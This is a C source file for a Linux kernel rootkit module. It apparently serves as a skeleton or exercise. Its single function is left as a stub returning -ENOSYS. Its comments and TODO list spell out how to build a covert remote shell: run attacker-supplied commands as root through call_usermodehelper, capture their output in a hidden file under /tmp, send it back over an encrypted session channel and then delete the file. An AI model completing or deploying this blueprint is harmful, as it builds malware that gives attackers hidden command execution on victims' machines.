// SPDX-License-Identifier: GPL-2.0
//
// Shell execution: run commands and return output over AEAD channel.
//
// Uses a temp file to capture stdout/stderr, then reads and sends
// the output back sealed. The temp file is cleaned up after each exec.
//
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/umh.h>

#include "rootkit.h"

#define RK_EXEC_OUT	"/tmp/.rk_out"

int rk_cmd_exec(struct rk_session *s, const char *cmdline)
{
	// TODO:
	// 1. kmalloc a wrapped command string:
	//    "<cmdline> > /tmp/.rk_out 2>&1"
	// 2. call_usermodehelper("/bin/sh", "-c", wrapped, UMH_WAIT_PROC)
	// 3. kfree the wrapped string
	// 4. filp_open RK_EXEC_OUT, loop kernel_read + rk_send_sealed
	// 5. filp_close
	// 6. Clean up temp file via call_usermodehelper "rm -f"
	// 7. Send trailing newline
	return -ENOSYS;
}
